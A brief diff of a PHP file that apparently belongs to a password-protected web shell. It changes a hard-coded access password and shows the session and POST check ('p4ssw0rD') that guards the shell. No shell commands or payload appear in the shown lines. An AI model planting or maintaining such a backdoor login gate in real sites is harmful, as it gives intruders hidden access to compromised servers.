@@ -65,7 +65,7 @@ color: #FFFFFF;
 font-family: verdana;
 }
 </style>';
-$password='alqaeda';
+$password='America2017@';
 $sess = __FILE__.$password;
 if(isset($_POST['p4ssw0rD']))
 {
